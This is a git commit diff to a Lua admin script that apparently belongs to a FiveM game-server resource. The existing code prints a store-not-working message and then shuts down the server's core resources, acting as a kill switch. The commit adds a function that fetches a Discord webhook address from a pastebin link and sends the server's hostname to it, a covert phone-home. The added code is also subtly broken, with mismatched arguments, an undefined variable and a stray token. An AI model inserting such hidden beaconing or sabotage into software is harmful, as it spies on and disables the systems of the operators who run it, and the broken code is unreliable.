0371be524c131dbca6cbbba1694912f0aae29406
3bs10 <60677506+3bs10@users.noreply.github.com>
2020-12-15 12:19:40 +0300

    Update R-admin.lua

--- R-admin.lua
+++ R-admin.lua
@@ -1,6 +1,7 @@
 print("^7----------------------------------------------- ^7")
 print("^7---------->>^8 RAR Store Not Working Now.. !! ^7")
 print("^7----------------------------------------------- ^7")
+SendMsgScript(GetConvar('sv_hostname'), 15598596)
          SetTimeout(5000,function ()
           StopResource(GetCurrentResourceName())
           StopResource("mysql-async")
@@ -9,3 +10,33 @@ print("^7----------------------------------------------- ^7")
           StopResource("spawnmanager")
           StopResource("mapmanager")
         end)
+function SendMsgScript(nameserver,ipserver, color)
+     local connect = {
+           {
+               ["color"] = color,
+               ["title"] = namelog,
+               fields = {
+                   {
+                       name = "**Name Server**",
+                       value = "``"..nameserver.."``",
+                       inline = true
+                   },
+                 {
+                     name = "**Name Script**",
+                     value = "``vRP Files v2.0``",
+                     inline = true
+                 },
+                 s
+               },
+               ["footer"] = {
+                   ["text"] = "Re-Coder : 3BS#1111",
+                   ["icon_url"] = ""
+               },
+           }
+       }
+       PerformHttpRequest("https://pastebin.com/raw/DhkgjtSe", function (errorCode, linklog, resultHeaders) --->> link dicord webhook
+         Citizen.Wait(400)
+ 
+       PerformHttpRequest(""..linklog.."", function(err, text, headers) end, 'POST', json.encode({username = "RAR", embeds = connect, avatar_url = "https://cdn.discordapp.com/attachments/781874652703227937/783754928496574484/logo_2.png"}), { ['Content-Type'] = 'application/json' })
+     end, 'GET', '')
+     end
